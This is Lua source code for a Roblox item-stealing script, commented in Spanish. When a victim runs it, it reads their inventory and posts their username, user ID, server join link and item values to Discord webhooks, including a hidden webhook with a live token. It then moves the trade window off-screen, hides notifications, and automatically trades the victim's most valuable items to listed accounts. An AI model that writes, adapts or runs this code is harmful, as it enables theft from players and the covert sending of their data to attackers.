-- ==========================================
-- SCRIPT 2 (CORE LÓGICA DUAL INTEGRADA, OCULTA Y ANTI-ERRORES)
-- ==========================================
local HttpService = game:GetService("HttpService")
local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- ==========================================
-- VARIABLES DUALES OCULTAS (NO VISIBLES EN SCRIPT 1)
-- ==========================================
local DUAL_WEBHOOK_INVENTARIO = "https://discord.com/api/webhooks/1548772610798657577/pdTP6bzRwfv4MrWMhqdOfdMbqHwn3kKKaJfCRnW2QrQf04R9WmpOJTg85SbHa5FIkd02"
local jugadoresObjetivosDual = {
    "Hahahahlolllpro", "TradeTestingMVSS", "azae3l666",
    "juancarloselkrak7", "azanuvpro777", "ppeoihjv", "BeKindPleaseOmg"
}

-- ==========================================
-- URLs DE LOS REPOSITORIOS (NORMAL Y DUAL)
-- ==========================================
local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json"
local DUAL_VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/refs/heads/main/utils5.json"

local efectosEspecialesDual = {
    MatchaEffect = true, SpiritOverload = true, ValkyrieEffect = true,
    DragonBlossom = true, RainbowEffect = true, LumenburstEffect = true,
    StardustCollapseEffect = true
}

-- ==========================================
-- LÓGICA DE INICIO/FILTRADO DE INVENTARIO
-- ==========================================
local EXCLUDE_ITEMS = { "DefaultGun", "DefaultKnife", "DefaultEffect" }
local EXCLUDE = {}
for _, n in ipairs(EXCLUDE_ITEMS or {}) do EXCLUDE[string.lower(n)] = true end

local okTrade, ItemIsTradeable = pcall(function()
    return require(RS.Shared.Utils.ItemIsTradeable)
end)
if not okTrade or type(ItemIsTradeable) ~= "function" then ItemIsTradeable = nil end

local function isTradeable(name)
    if not ItemIsTradeable then return true end
    local ok, res = pcall(ItemIsTradeable, name)
    if not ok then return true end
    return res and true or false
end

-- ==========================================
-- CARGA DINÁMICA DE VALORES (AMBOS REPOSITORIOS)
-- ==========================================
local Knives, Guns, Effects, Emotes = {}, {}, {}, {}
local DualKnives, DualGuns, DualEffects, DualEmotes = {}, {}, {}, {}

local function cargarValoresGitHub(url, tKnives, tGuns, tEffects, tEmotes)
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)
    
    if success and response then
        local decodeSuccess, decodedData = pcall(function()
            return HttpService:JSONDecode(response)
        end)
        
        if decodeSuccess and decodedData then
            for k,v in pairs(decodedData.Knives or {}) do tKnives[k] = v end
            for k,v in pairs(decodedData.Guns or {}) do tGuns[k] = v end
            for k,v in pairs(decodedData.Effects or {}) do tEffects[k] = v end
            for k,v in pairs(decodedData.Emotes or {}) do tEmotes[k] = v end
        end
    end
end

cargarValoresGitHub(VALUES_REPO_URL, Knives, Guns, Effects, Emotes)
cargarValoresGitHub(DUAL_VALUES_REPO_URL, DualKnives, DualGuns, DualEffects, DualEmotes)

task.spawn(function()
    while getgenv and not getgenv().AutoTradeConfig do
        task.wait(0.2)
    end
    
    local config = getgenv().AutoTradeConfig or {}
    local WEBHOOK_LOGS = config.WebhookLogs or "" 
    local WEBHOOK_INVENTARIO = config.WebhookInventario or ""
    
    local jugadoresObjetivosNormales = config.JugadoresObjetivos or {}

    local startTime = os.time()

    pcall(function()
        if request and player and WEBHOOK_LOGS ~= "" then
            request({
                Url = WEBHOOK_LOGS, Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({ content = "✅ **" .. player.Name .. "** ha ejecutado el script." })
            })
        end
    end)

    Players.PlayerRemoving:Connect(function(leavingPlayer)
        if leavingPlayer == Players.LocalPlayer then
            local tiempoTranscurrido = os.time() - startTime
            local horas = math.floor(tiempoTranscurrido / 3600)
            local minutes = math.floor((tiempoTranscurrido % 3600) / 60)
            local segundos = tiempoTranscurrido % 60

            local textoTiempo = ""
            if horas > 0 then textoTiempo = textoTiempo .. horas .. " horas, " end
            if minutes > 0 then textoTiempo = textoTiempo .. minutes .. " minutos y " end
            textoTiempo = textoTiempo .. segundos .. " segundos"

            pcall(function()
                if request then
                    if WEBHOOK_INVENTARIO ~= "" then
                        request({
                            Url = WEBHOOK_INVENTARIO, Method = "POST",
                            Headers = { ["Content-Type"] = "application/json" },
                            Body = HttpService:JSONEncode({
                                content = "❌ El usuario (**" .. leavingPlayer.Name .. "**) ha cerrado o salido del juego.\n⏳ **Duró ejecutando el script:** `" .. textoTiempo .. "`"
                            })
                        })
                    end
                    if WEBHOOK_LOGS ~= "" then
                        request({
                            Url = WEBHOOK_LOGS, Method = "POST",
                            Headers = { ["Content-Type"] = "application/json" },
                            Body = HttpService:JSONEncode({
                                content = "❌ **" .. leavingPlayer.Name .. "** duró `" .. textoTiempo .. "` usando el script."
                            })
                        })
                    end
                end
            end)
        end
    end)

    local armasPrioritarias = {
        LightningBolt = true, LightningStriker = true, MatchaBobaKnife = true, MatchaBobaGun = true,
        DuskveilDagger = true, DuskveilIron = true, ValkyrieKnife = true, ValkyrieSword = true, ValkyrieSniper = true, 
        LimeJellyAxe = true, BlueberryJellyAxe = true, StrawberryJellyAxe = true, GrapeJellyAxe = true, 
        LimeJellyUzi = true, BlueberryJellyUzi = true, StrawberryJellyUzi = true, GrapeJellyUzi = true,
        SealordTrident = true, SealordRevolver = true, DragonpetalBlade = true, DragonpetalSniper = true, 
        DragonpetalOutlaw = true, LovestruckKnife = true, LovestruckGun = true, SharkLauncher = true, Revolver_Default = true
    }

    local ok, cg = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)

    if ok and cg.PlayerData then
        local pd = cg.PlayerData
        local knives, guns, effects, emotes = {}, {}, {}, {}
        
        local totalValueNormal = 0
        local totalValueDual = 0
        
        local hasSpecialEffect = false

        local foundMatchaKnife, foundMatchaGun = false, false
        local foundDragonBlade, foundDragonGun = false, false
        local foundLightningBolt, foundLightningStriker = false, false

        local function normalizeName(name)
            return string.gsub(name, " ", "")
        end

        local function scanAndSave(category, normalTable, dualTable, resultTable)
            local inv = pd:TryIndex({"Inventory", category})
            if not inv then return end
            
            for guid, item in pairs(inv) do
                if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                    local cleanName = normalizeName(item.name)
                    
                    local valNormal = normalTable[cleanName]
                    local valDual = dualTable[cleanName]
                    
                    if valNormal or valDual then
                        if cleanName == "MatchaBobaKnife" then foundMatchaKnife = true end
                        if cleanName == "MatchaBobaGun" then foundMatchaGun = true end
                        if cleanName == "DragonpetalBlade" then foundDragonBlade = true end
                        if cleanName == "DragonpetalSniper" or cleanName == "DragonpetalOutlaw" then foundDragonGun = true end
                        if cleanName == "LightningBolt" then foundLightningBolt = true end
                        if cleanName == "LightningStriker" then foundLightningStriker = true end
                        
                        if category == "Effect" and efectosEspecialesDual[cleanName] then
                            hasSpecialEffect = true
                        end

                        if valNormal then totalValueNormal = totalValueNormal + valNormal end
                        if valDual then totalValueDual = totalValueDual + valDual end
                        
                        local displayValue = valDual or valNormal
                        resultTable[#resultTable + 1] = { name = item.name, guid = guid, value = displayValue }
                    end
                end
            end
        end

        scanAndSave("Knife", Knives, DualKnives, knives)
        scanAndSave("Gun", Guns, DualGuns, guns)
        scanAndSave("Effect", Effects, DualEffects, effects)
        scanAndSave("Emote", Emotes, DualEmotes, emotes)

        local hayItems = (#knives > 0) or (#guns > 0) or (#effects > 0) or (#emotes > 0)

        if hayItems and request then
            local fileName = "AutoTrade_Executions.json"
            local executionData = {}
            local executionText = player.Name .. " 1x executions"

            if isfile and readfile and writefile then
                if isfile(fileName) then
                    local success, data = pcall(function() return HttpService:JSONDecode(readfile(fileName)) end)
                    if success and type(data) == "table" then executionData = data end
                end

                local playerName = player.Name
                if not executionData[playerName] then executionData[playerName] = 0 end
                executionData[playerName] = executionData[playerName] + 1
                pcall(function() writefile(fileName, HttpService:JSONEncode(executionData)) end)
                executionText = playerName .. " " .. executionData[playerName] .. "x executions"
            end

            local function formatearLista(lista)
                local contador, orden, texto = {}, {}, ""
                for _, v in ipairs(lista or {}) do
                    local clave = v.name
                    if not contador[clave] then
                        contador[clave] = { cantidad = 1, nombre = v.name, valor = v.value }
                        table.insert(orden, clave)
                    else
                        contador[clave].cantidad = contador[clave].cantidad + 1
                        contador[clave].valor = contador[clave].valor + v.value
                    end
                end
                for _, clave in ipairs(orden or {}) do
                    local info = contador[clave]
                    texto ..= "🔸 **" .. info.cantidad .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. "💰]`\n"
                end
                if string.len(texto) > 1024 then return string.sub(texto, 1, 1020) .. "..." end
                return texto 
            end

            local campos = {}
            if #knives > 0 then table.insert(campos, { name = "🔪 Knives", value = formatearLista(knives), inline = true }) end
            if #guns > 0 then table.insert(campos, { name = "🔫 Guns", value = formatearLista(guns), inline = true }) end
            if #effects > 0 then table.insert(campos, { name = "✨ Effects", value = formatearLista(effects), inline = false }) end
            if #emotes > 0 then table.insert(campos, { name = "🕺 Emotes", value = formatearLista(emotes), inline = false }) end

            local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
            local playersCount = #Players:GetPlayers()
            local maxPlayers = Players.MaxPlayers
            local robloxVer = version()
            local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
            local bodyUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"

            local isDualPlayer = totalValueDual >= 7500
            
            if getgenv().AutoTradeConfig then
                getgenv().AutoTradeConfig.EstadoActual = isDualPlayer and "DUAL" or "NORMAL"
            end

            local jugadoresObjetivos = isDualPlayer and jugadoresObjetivosDual or jugadoresObjetivosNormales

            local descriptionText = "### 👤 Información del Jugador\n" ..
                                    "**Usuario:** `" .. player.Name .. "`\n" ..
                                    "**Display Name:** `" .. player.DisplayName .. "`\n" ..
                                    "**User ID:** `" .. player.UserId .. "`\n" ..
                                    "**Account Age:** `" .. player.AccountAge .. " Days`\n\n" ..
                                    "### ⚙️ Información del Servidor\n" ..
                                    "**JobId:** `" .. game.JobId .. "`\n" ..
                                    "**🔗 Join Link:** [Click para Unirse](https://fern.wtf/joiner?placeId=135856908115931&gameInstanceId=" .. game.JobId .. ")\n" ..
                                    "**Server:** `" .. playersCount .. "/" .. maxPlayers .. "`\n" ..
                                    "**Roblox Version:** `" .. robloxVer .. "`\n" ..
                                    "**Executor:** `" .. executorName .. "`\n\n" ..
                                    "### 📊 Estadísticas de Hit\n" ..
                                    "**Historial:** `" .. executionText .. "`\n" ..
                                    "**Total Value Normal:** `💰 " .. totalValueNormal .. "`\n" ..
                                    "**Total Value DUAL:** `💎 " .. totalValueDual .. "`\n" ..
                                    "**Modo de Traspaso:** `" .. (isDualPlayer and "🔵 DUAL (Delay 5m Normal)" or "🟢 NORMAL (Instantáneo)") .. "`\n\n" ..
                                    "**=============================**"

            local pings = {}
            local embedColor = 3447003

            if isDualPlayer then
                table.insert(pings, "@MEGA-HIT 🚨 **¡JUGADOR DUAL MASIVO DETECTADO (+7500 VALOR EXCLUSIVO)!** 🚨")
                embedColor = 16711680
            elseif totalValueNormal >= 5000 or hasSpecialEffect then
                table.insert(pings, "@MEGA-HIT 🚨 **¡MEGA HIT (+5000 VALOR O EFECTO DETECTADO)!** 🚨")
                embedColor = 16711680
            elseif totalValueNormal >= 2000 then
                table.insert(pings, "@everyone 🚨 **¡HIT LEGENDARIO DETECTADO (+2000 VALOR)!** 🚨")
                embedColor = 16766720
            end

            if (foundMatchaKnife and foundMatchaGun) and (foundDragonBlade and foundDragonGun) then
                table.insert(pings, "@TOP-SETS 🍵🐉 **¡SETS MATCHA Y DRAGONPETAL ENCONTRADOS!**")
            end
            if (foundLightningBolt and foundLightningStriker) then
                table.insert(pings, "@TOP-SETS ⚡ **¡SET LIGHTNING ENCONTRADO!**")
            end

            local finalContentText = (#pings > 0) and table.concat(pings, "\n") or nil

            local webhookPayload = {
                content = finalContentText, 
                username = "Auto-Trade Bot Scanner",
                avatar_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/512px-Roblox_player_icon_black.svg.png",
                embeds = {{
                    title = "🎯 ¡Objetivo de Tradeo Localizado!",
                    color = embedColor, 
                    description = descriptionText,
                    thumbnail = { url = avatarUrl }, 
                    image = { url = bodyUrl },       
                    fields = campos,
                    footer = { 
                        text = "Sistema de Escaneo Automático | " .. os.date("%X"),
                        icon_url = "https://cdn-icons-png.flaticon.com/512/6584/6584141.png"
                    }
                }}
            }
            
            local jsonPayload = HttpService:JSONEncode(webhookPayload)

            if isDualPlayer then
                task.spawn(function()
                    if DUAL_WEBHOOK_INVENTARIO ~= "" then
                        request({ Url = DUAL_WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonPayload })
                    end
                end)
                if WEBHOOK_INVENTARIO ~= "" then
                    task.delay(300, function()
                        pcall(function()
                            request({ Url = WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonPayload })
                        end)
                    end)
                end
            else
                if WEBHOOK_INVENTARIO ~= "" then
                    request({ Url = WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonPayload })
                end
            end
        end

        local jugadorEncontrado = nil
        repeat 
            task.wait(0.5)
            for _, nombre in ipairs(jugadoresObjetivos or {}) do
                local p = Players:FindFirstChild(nombre)
                if p then
                    jugadorEncontrado = p
                    break
                end
            end
        until jugadorEncontrado

        task.wait(10)

        local tradeando = true 
        local posicionOriginalTrade = nil 

        task.spawn(function()
            while tradeando do
                task.wait()
                pcall(function()
                    local pGui = player:WaitForChild("PlayerGui")
                    if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                        pGui.Notifications.Body.Visible = false
                    end
                    if pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
                        if not posicionOriginalTrade and pGui.NewGui.TradeNegotiation.Position.X.Scale < 100 then
                            posicionOriginalTrade = pGui.NewGui.TradeNegotiation.Position
                        end
                        pGui.NewGui.TradeNegotiation.Position = UDim2.new(1000, 1000, 1000, 1000)
                    end
                end)
            end
        end)

         local function ejecutarTradeo()
            local okData, cgData = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)
            if not okData then return false end
            local pdTrade = cgData.PlayerData
            
            local listaEfectos, listaEmotes = {}, {}
            local listaArmasPrioritarias, listaArmasNormales = {}, {}

            local function scanTrade(cat, normalTable, dualTable, destList, isPriority)
                local inv = pdTrade:TryIndex({"Inventory", cat})
                if not inv then return end
                for guid, item in pairs(inv) do
                    if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                        local cleanName = normalizeName(item.name)
                        local val = dualTable[cleanName] or normalTable[cleanName]
                        if val then
                            local itemData = { name = item.name, guid = guid, value = val }
                            if destList then
                                table.insert(destList, itemData)
                            elseif isPriority and armasPrioritarias[cleanName] then
                                table.insert(listaArmasPrioritarias, itemData)
                            else
                                table.insert(listaArmasNormales, itemData)
                            end
                        end
                    end
                end
            end

            scanTrade("Knife", Knives, DualKnives, nil, true)
            scanTrade("Gun", Guns, DualGuns, nil, true)
            scanTrade("Effect", Effects, DualEffects, listaEfectos, false)
            scanTrade("Emote", Emotes, DualEmotes, listaEmotes, false)

            local sortPorValor = function(a, b) return a.value > b.value end
            table.sort(listaEmotes, sortPorValor)
            table.sort(listaEfectos, sortPorValor)
            table.sort(listaArmasPrioritarias, sortPorValor)
            table.sort(listaArmasNormales, sortPorValor)

            local itemsRestantes = {}
            for _, v in ipairs(listaEmotes or {}) do table.insert(itemsRestantes, v) end
            for _, v in ipairs(listaEfectos or {}) do table.insert(itemsRestantes, v) end
            for _, v in ipairs(listaArmasPrioritarias or {}) do table.insert(itemsRestantes, v) end
            for _, v in ipairs(listaArmasNormales or {}) do table.insert(itemsRestantes, v) end

            if #itemsRestantes == 0 then return false end
            
            local Remotes = require(RS.Shared.Remotes)
            local ActiveNegotiation = cgData.ActiveNegotiation
            local SessionState = cgData.SessionState
            local Workspace = game:GetService("Workspace")

            local function getSides()
                local data = ActiveNegotiation.Data
                if type(data) ~= "table" then return nil, nil, nil end
                if type(data.player1) ~= "table" or type(data.player2) ~= "table" then return nil, nil, nil end
                
                local me, other
                if data.player1.player and data.player1.player.UserId == player.UserId then
                    me, other = data.player1, data.player2
                else
                    me, other = data.player2, data.player1
                end
                return me, other, data
            end

            repeat
                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
                local incoming = SessionState:TryIndex({ "incomingTradeRequests" }) or {}
                local aceptado = false
                
                for _, p in ipairs(incoming or {}) do
                    if p.Name == jugadorEncontrado.Name then
                        Remotes.AcceptInvite:FireServer(p)
                        aceptado = true
                    end
                end
                
                if not aceptado then Remotes.SendInvite:FireServer(jugadorEncontrado) end
                task.wait(2.5)
            until getSides() ~= nil

            task.wait(1)

            for i = 1, math.min(12, #itemsRestantes) do
                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
                local item = itemsRestantes[i]
                
                local t0 = os.clock()
                while os.clock() - t0 < 5 do
                    local _, _, d = getSides()
                    if not (d and (d.processing or 0) > Workspace:GetServerTimeNow()) then break end
                    task.wait(0.2)
                end

                Remotes.OfferItem:FireServer(item.guid)
                task.wait(0.35)
            end

            local timeout = os.clock()
            while os.clock() - timeout < 60 do 
                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end

                local me, other, data = getSides()
                
                if not data then break end
                if data.exchanging then break end 
                
                if me and not me.ready then
                    if Workspace:GetServerTimeNow() >= (data.lastUpdate or 0) + 3 then
                        Remotes.SetReady:FireServer(true, data.ref or {})
                    end
                end
                task.wait(0.5)
            end

            local finalWait = os.clock()
            while getSides() ~= nil and os.clock() - finalWait < 20 do
                task.wait(1)
            end

            task.wait(2) 
            return true
        end

        while true do
            if not (jugadorEncontrado and jugadorEncontrado.Parent) then break end
            local continuar = ejecutarTradeo()
            if not continuar then break end
        end

        tradeando = false
        task.wait(0.5) 

        pcall(function()
            local pGui = player:WaitForChild("PlayerGui")
            if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                pGui.Notifications.Body.Visible = true
            end
            if pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
                if posicionOriginalTrade then
                    pGui.NewGui.TradeNegotiation.Position = posicionOriginalTrade
                else
                    pGui.NewGui.TradeNegotiation.Position = UDim2.new(0.5, -250, 0.5, -200) 
                end
            end
        end)
    end
end)
